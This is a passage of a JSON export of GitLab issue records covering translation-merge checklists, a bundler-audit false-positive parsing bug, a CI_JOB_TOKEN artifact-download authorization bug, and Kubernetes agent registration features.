964,"title":"Update translations levels (January 2022)","description":"## Introduction\n\nWith the implementation of the feature to show the [translation coverage](https://gitlab.com/gitlab-org/gitlab/-/issues/328430) in the language selection dropdown, the translation levels need to be updated on a monthly cadence. \n\n## Proposal\n\nOnce the monthly merge of the new translations is complete, update the translation levels [data](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/i18n.rb#L43) from Crowdin.\n\n## Documentation\n\n* https://docs.gitlab.com/ee/development/i18n/merging_translations.html#manually-update-the-translation-levels\n\n#### ToDo\n* [x] After cloning: update Title, set Milestone, Due date (15th), Related to previous month's issue.\n* [x] After the 1st of the month: assign to yourself, set ~2526320 \n* [x] Complete the [regular monthly merge](https://gitlab.com/groups/gitlab-org/-/epics/3571) of translations from Crowdin.\n* [x] Get the translation levels (% approved words) from [Crowdin](https://crowdin.com/project/gitlab-ee).\n* [x] Create an MR to update the translation levels [data](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/i18n.rb#L43).\n* [x] Associate that MR to this issue.\n* [x] Complete the MR.\n* [x] When done, clone [this template issue](https://gitlab.com/gitlab-org/gitlab/-/issues/339985) for the next milestone.","state":"closed","created_at":"2021-12-07T00:10:40.457Z","updated_at":"2022-03-28T15:40:01.004Z","closed_at":"2022-03-02T23:12:32.171Z","closed_by":{"id":5247073,"username":"hdelalic","name":"Haris Delali","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"labels":["Category:Internationalization","Deliverable","Next Up","backend","devops::manage","estimation::completed","group::import","milestone::p2","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":5247073,"username":"hdelalic","name":"Haris Delali","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delali","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":5247073,"username":"hdelalic","name":"Haris Delali","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-01-15","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347276","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":8},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347276","notes":"https://gitlab.com/api/v4/projects/278964/issues/347276/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347276/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347276","relative":"#347276","full":"gitlab-org/gitlab#347276"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3571,"epic":{"id":67045,"iid":3571,"title":"Regular i18n translation merges","url":"/groups/gitlab-org/-/epics/3571","group_id":9970,"human_readable_timestamp":"\u003cstrong\u003e1033\u003c/strong\u003e days elapsed"},"iteration":null,"health_status":null},{"id":98559663,"iid":347275,"project_id":278964,"title":"Merge i18n translations (Jan 2022)","description":"Merge the latest i18n translations from Crowdin on a monthly cadence.\n\nDocumentation available here: https://docs.gitlab.com/ee/development/i18n/merging_translations.html\n\n#### ToDo\n* [x] After cloning: update Title, set Milestone, Due date (15th), Related to previous month's issue.\n* [x] After the 1st of the month: assign to yourself, set ~2526320 \n* [x] If needed, configure the [GitLab-Crowdin integration](https://docs.gitlab.com/ee/development/i18n/merging_translations.html#recreate-the-gitlab-integration-in-crowdin)\n* [x] Kick off a sync from [Crowdin](https://crowdin.com/project/gitlab-ee/apps/system/gitlab)\n* [x] Find the [MR](https://gitlab.com/gitlab-org/gitlab/-/merge_requests?scope=all\u0026utf8=%E2%9C%93\u0026state=opened\u0026author_username=gitlab-crowdin-bot) created by @gitlab-crowdin-bot and associate it with this issue\n* [x] Complete the MR\n* [x] Update the translation levels [data](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/i18n.rb#L43) with the latest numbers. (Find the issue [here](https://gitlab.com/groups/gitlab-org/-/epics/3571))\n* [x] When done, clone [this template issue](https://gitlab.com/gitlab-org/gitlab/-/issues/339980) for the next milestone.","state":"closed","created_at":"2021-12-07T00:08:00.278Z","updated_at":"2022-03-28T15:40:01.111Z","closed_at":"2022-01-07T20:02:32.818Z","closed_by":{"id":5247073,"username":"hdelalic","name":"Haris Delali","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"labels":["Category:Internationalization","Deliverable","Next Up","backend","devops::manage","estimation::completed","group::import","milestone::p2","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":5247073,"username":"hdelalic","name":"Haris Delali","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delali","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":5247073,"username":"hdelalic","name":"Haris Delali","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-01-15","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347275","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":8,"completed_count":8},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 8 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347275","notes":"https://gitlab.com/api/v4/projects/278964/issues/347275/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347275/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347275","relative":"#347275","full":"gitlab-org/gitlab#347275"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3571,"epic":{"id":67045,"iid":3571,"title":"Regular i18n translation merges","url":"/groups/gitlab-org/-/epics/3571","group_id":9970,"human_readable_timestamp":"\u003cstrong\u003e1033\u003c/strong\u003e days elapsed"},"iteration":null,"health_status":null},{"id":98537172,"iid":347246,"project_id":278964,"title":"Move Product Intelligence Dangerfile logic to `tooling/danger/product_intelligence.rb`","description":"The following discussion from !75949 should be addressed:\n\n- [ ] @rpereira2 started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75949#note_753464194):  (+1 comment)\n\n    \u003e Since we can't test the Dangerfile, it would be useful to move as much logic as possible out of this file and into `tooling/danger/product_intelligence.rb`, for example like [danger/changelog/Dangerfile](https://gitlab.com/gitlab-org/gitlab/blob/master/danger/changelog/Dangerfile).\n    \u003e \n    \u003e Should we open a follow-up issue for this?","state":"closed","created_at":"2021-12-06T16:38:17.378Z","updated_at":"2022-04-01T07:55:34.352Z","closed_at":"2022-04-01T07:55:34.331Z","closed_by":{"id":1863977,"username":"michold","name":"Micha Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"labels":["Category:Service Ping","backend","devops::growth","group::product intelligence","maintenance::workflow","product intelligence::onboarding issue","section::growth","type::maintenance","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":1863977,"username":"michold","name":"Micha Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"}],"author":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"type":"ISSUE","assignee":{"id":1863977,"username":"michold","name":"Micha Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347246","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347246","notes":"https://gitlab.com/api/v4/projects/278964/issues/347246/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347246/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347246","relative":"#347246","full":"gitlab-org/gitlab#347246"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98536382,"iid":347245,"project_id":278964,"title":"bundler-audit reports incorrect, empty vulnerability","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nIn some cases, the bundler-audit analyzer reports a vulnerability whose fields are empty or have the default value. This happens when `bundle audit check` logs a warning message before listing the vulnerabilities or no vulnerabilities at all.\n\nThe empty vulnerability looks like the following: \n\n```json\n{\n      \"id\": \"85008fe3bf9c69f6acbc1b2f6f56b1540498ac7abcfc27f589ddd17357968c5f\",\n      \"category\": \"dependency_scanning\",\n      \"message\": \"Vulnerability in \",\n      \"cve\": \"Gemfile.lock:\",\n      \"severity\": \"Unknown\",\n      \"scanner\": {\n        \"id\": \"bundler_audit\",\n        \"name\": \"bundler-audit\"\n      },\n      \"location\": {\n        \"file\": \"Gemfile.lock\",\n        \"dependency\": {\n          \"package\": {}\n        }\n      },\n```\n\nHowever there are no vulnerabilities when running bundler-audit locally:\n\n```\n\u003e /performance - update-ruby-2.7.4: bundle-audit               \nNo vulnerabilities found\n```\n\n### Further details\n\nAs of today, bundler-audit is one of the two Dependency Scanning scanners capable of scanning bundler lock files. Technically, the analyzer is a wrapper that runs `bundle audit`, processes its text output, and generate a GitLab Dependency Scanning report. There's a bug in the text parser.\n\n### Steps to reproduce\n\n1. Create a GitLab project with [Gemfile](/uploads/ca89dbbcbdb7df7f04909df61c91d2de/Gemfile) and [Gemfile.lock](/uploads/9ee76192a3ec71a2839dbd5672d53d13/Gemfile.lock).\n1. Enable GitLab Dependency Scanning and run a CI pipeline.\n1. Check the CI artifact created by the `bundler-audit_dependency-scanning` job.\n\n### Sample project\n\n1. Open [GPT Security report](https://gitlab.com/gitlab-org/quality/performance/-/pipelines/423504957/security)\n2. Click on `Hide dismissed` and review Vulnerability.  - artifact for bundler [gl-dependency-scanning-report__4_.json](/uploads/19dff3b12fef0403c8e4dd4876af5743/gl-dependency-scanning-report__4_.json)\n\n\u003cdetails\u003e\n\u003csummary\u003eArtifact - gl-dependency-scanning-report\u003c/summary\u003e\n\n```json\n{\n  \"version\": \"14.0.0\",\n  \"vulnerabilities\": [\n    {\n      \"id\": \"85008fe3bf9c69f6acbc1b2f6f56b1540498ac7abcfc27f589ddd17357968c5f\",\n      \"category\": \"dependency_scanning\",\n      \"message\": \"Vulnerability in \",\n      \"cve\": \"Gemfile.lock:\",\n      \"severity\": \"Unknown\",\n      \"scanner\": {\n        \"id\": \"bundler_audit\",\n        \"name\": \"bundler-audit\"\n      },\n      \"location\": {\n        \"file\": \"Gemfile.lock\",\n        \"dependency\": {\n          \"package\": {}\n        }\n      },\n      \"identifiers\": [],\n      \"links\": [\n        {\n          \"url\": \"\"\n        }\n      ]\n    }\n  ],\n  \"remediations\": [],\n  \"scan\": {\n    \"scanner\": {\n      \"id\": \"bundler_audit\",\n      \"name\": \"bundler-audit\",\n      \"url\": \"https://github.com/rubysec/bundler-audit\",\n      \"vendor\": {\n        \"name\": \"GitLab\"\n      },\n      \"version\": \"0.7.0.1\"\n    },\n    \"type\": \"dependency_scanning\",\n    \"start_time\": \"2021-12-06T14:46:22\",\n    \"end_time\": \"2021-12-06T14:46:24\",\n    \"status\": \"success\"\n  }\n}\n\n```\n\n\u003c/details\u003e\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\nDependency Scanning shows vulnerability incorrectly due to a possibly a parsing error.\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\nDependency Scanning doesn't show vulnerability if `bundler-audit` passes with `No vulnerabilities found`\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eScreenshot\u003c/summary\u003e\n\n![Screenshot_2021-12-06_at_19.02.27](/uploads/6c50392919ac657140e9a027e48eff0e/Screenshot_2021-12-06_at_19.02.27.png)\n\n\u003c/details\u003e\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Implementation plan\n\n- [ ] TIMEBOXED to ~1 day: investigate the problem, try to reproduce and debug/fix if possible. \n\n### Possible fixes\n\nWe should either:\n- Fix the parser of the text output.\n  - Remove the warnings.\n  - Ignore everything until there's something that looks like a vulnerability section.\n- Use the JSON output bundler-audit.\n\nParsing the JSON output seems more reliable, and it's possibly less time consuming compared to making sense of a bug in the text parser.","state":"closed","created_at":"2021-12-06T16:25:46.601Z","updated_at":"2022-03-13T14:03:50.539Z","closed_at":"2022-03-01T07:27:32.984Z","closed_by":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"labels":["Category:Dependency Scanning","Stretch","backend","devops::secure","group::composition analysis","missed:14.8","priority::2","section::sec","severity::3","type::bug","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"}],"author":{"id":4477602,"username":"niskhakova","name":"Nailia Iskhakova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477602/avatar.png","web_url":"https://gitlab.com/niskhakova"},"type":"ISSUE","assignee":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"user_notes_count":20,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347245","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347245","notes":"https://gitlab.com/api/v4/projects/278964/issues/347245/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347245/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347245","relative":"#347245","full":"gitlab-org/gitlab#347245"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7298,"epic":{"id":405983,"iid":7298,"title":"remove bundler-audit","url":"/groups/gitlab-org/-/epics/7298","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":98535644,"iid":347244,"project_id":278964,"title":"Backend: Downloading artifacts fails via API with CI_JOB_TOKEN for the same project","description":"## Problem\n\nWhen trying to download artifacts using CI_JOB_TOKEN from the same project where the job token originates from, fails with 401 status.\n\nWe allow artifacts download via [`needs`](https://docs.gitlab.com/ee/ci/yaml/#needsproject) only to ~\"GitLab Premium\" today as a `cross_project_pipelines` feature.\n\nHowever, this feature today blocks even downloads within the same project\n\n## Proposal\n\nThe code that blocks the download is:\n\n```ruby\n# ee/lib/ee/api/ci/job_artifacts.rb\ndef authorize_download_artifacts!\n  super\n  check_cross_project_pipelines_feature!\nend\n\ndef check_cross_project_pipelines_feature!\n  if job_token_authentication? \u0026\u0026 !user_project.licensed_feature_available?(:cross_project_pipelines)\n    not_found!('Project')\n  end\nend\n```\n\nIt should probably be: \n\n```ruby\ndef check_cross_project_pipelines_feature!\n  if job_token_authentication? \u0026\u0026 \n    @current_authenticated_job.project != user_project \u0026\u0026 \n    !user_project.licensed_feature_available?(:cross_project_pipelines)\n    not_found!('Project')\n  end\nend\n```","state":"closed","created_at":"2021-12-06T16:10:54.005Z","updated_at":"2022-08-15T10:13:18.640Z","closed_at":"2022-08-15T10:13:18.602Z","closed_by":{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"labels":["CI artifacts","Category:Build Artifacts","Category:Continuous Integration","Verify::P1","approaching-SLO","backend","devops::verify","group::pipeline insights","missed-SLO","priority::3","section::ops","severity::3","type::bug","workflow::in dev"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"}],"author":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"type":"ISSUE","assignee":{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"user_notes_count":41,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-08-13","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347244","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347244","notes":"https://gitlab.com/api/v4/projects/278964/issues/347244/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347244/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347244","relative":"#347244","full":"gitlab-org/gitlab#347244"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5755,"epic":{"id":249399,"iid":5755,"title":"Download/Upload Artifacts Via API","url":"/groups/gitlab-org/-/epics/5755","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98533132,"iid":347240,"project_id":278964,"title":"Change the UI to support agent registration with and without a config","description":"## Scope\n\nThis issue is part of a bigger development effort described in detail by its epic. The scope of this issue is to create the frontend\n\n## Actions\n\n- [x] Change the UI to provide a list of unregistered agent configurations. \n- [x] Add UI to register an agent without a configuration file.\n- [x] The agent details UI should highlight that this agent does not have a configuration file\n- [x] Update the docs\n\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2021-12-06T15:30:37.986Z","updated_at":"2022-03-17T10:12:47.188Z","closed_at":"2022-03-17T10:12:47.020Z","closed_by":{"id":9094263,"username":"anna_vovchenko","name":"Anna Vovchenko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9094263/avatar.png","web_url":"https://gitlab.com/anna_vovchenko"},"labels":["Category:Kubernetes Management","GitLab Free","Hackathon","Stretch","Technical Writing","candidate::14.9","devops::configure","direction","documentation","frontend","good for new contributors","group::configure","section::ops","type::feature","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":9094263,"username":"anna_vovchenko","name":"Anna Vovchenko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9094263/avatar.png","web_url":"https://gitlab.com/anna_vovchenko"}],"author":{"id":4545061,"username":"nagyv-gitlab","name":"Viktor Nagy (GitLab)","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fb255c1e9c228b9356af165939b3ac9b?s=80\u0026d=identicon","web_url":"https://gitlab.com/nagyv-gitlab"},"type":"ISSUE","assignee":{"id":9094263,"username":"anna_vovchenko","name":"Anna Vovchenko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9094263/avatar.png","web_url":"https://gitlab.com/anna_vovchenko"},"user_notes_count":17,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347240","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":4},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347240","notes":"https://gitlab.com/api/v4/projects/278964/issues/347240/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347240/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347240","relative":"#347240","full":"gitlab-org/gitlab#347240"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7219,"epic":{"id":400265,"iid":7219,"title":"The agent should act as a CI/CD tunnel without configuration for Agent projects","url":"/groups/gitlab-org/-/epics/7219","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98533097,"iid":347239,"project_id":278964,"title":"Allow registering an agent without a config file","description":"\u003c!-- This issue template can be used a great starting point for feature requests. The last section \"Release notes\" can be used as a summary of the feature and is also required if you want to have your release post blog MR auto generated using the release post item generator:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator. The remaining sections are the backbone for every feature in GitLab. --\u003e\n\n## Release notes \n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n## Problem to solve \n\n\u003c!-- What is the user problem you are trying to solve with this issue? --\u003e\n\nAs an Application Operator/Software engineer, I want to start using the GitLab Kubernetes Agent with minimal effort for my projects, using the CI tunnel, so I can focus on writing business code, instead of ops.\n\n## Definition of done \n\n\u003c!-- Use this section to explain the feature and how it will work. It can be helpful to add technical details, design proposals, and links to related epics or issues. --\u003e\n\n- [x] The agent should work with a default agent configuration when no agent configuration is available under `.gitlab/agents/\u003cagent-name\u003e/config.yaml`\n- [x] This default configuration should enable project level CI/CD tunnel for the agent configuration project\n- [x] Registering a new agent should check that an agent with that name does not exist and the agent name can be used as a path segment. The registration should still work if a config file is present.\n- [ ] Document how to get started with CI/CD tunnel without configuration\n- [x] KAS does not error when an agent has no config file - https://gitlab.com/gitlab-org/cluster-integration/gitlab-agent/-/merge_requests/583\n\n\n### Optional ideas\n\nThe agent details UI should provide a single-click to create an MR with the default configuration pre-filled (it should be easy to take ownership of the agent without changing the existing workflow)\n   - In the first iteration we could just have a description, show the default configuration as text and have a button to open the Web IDE.\n\n## Documentation\n\n- Document the default setting\n- Document how to take ownership of the configuration (by creating an agent config file)\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2021-12-06T15:30:16.987Z","updated_at":"2022-03-30T18:15:45.015Z","closed_at":"2022-02-01T19:22:39.642Z","closed_by":{"id":4545061,"username":"nagyv-gitlab","name":"Viktor Nagy (GitLab)","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fb255c1e9c228b9356af165939b3ac9b?s=80\u0026d=identicon","web_url":"https://gitlab.com/nagyv-gitlab"},"labels":["Category:Kubernetes Management","Hackathon","[deprecated] Accepting merge requests","backend","candidate::14.9","devops::configure","direction","documentation","good for new contributors","group::configure","section::ops","type::feature","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":4545061,"username":"nagyv-gitlab","name":"Viktor Nagy 